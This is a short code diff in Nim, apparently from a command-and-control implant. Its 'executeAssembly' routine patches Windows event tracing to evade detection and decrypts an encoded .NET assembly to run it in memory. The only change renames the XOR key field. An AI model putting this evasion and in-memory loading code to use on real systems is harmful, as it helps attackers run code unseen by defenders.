@@ -39,7 +39,7 @@ proc executeAssembly*(li : Listener, args : varargs[string]) : string =
         if res == 2:
             result.add(obf("[+] ETW already patched!\n"))
 
-    var dec = decryptData(assemblyB64, li.cryptKey)
+    var dec = decryptData(assemblyB64, li.UNIQUE_XOR_KEY)
     var decStr: string = cast[string](dec)
     var decompressed: string = uncompress(decStr)
 
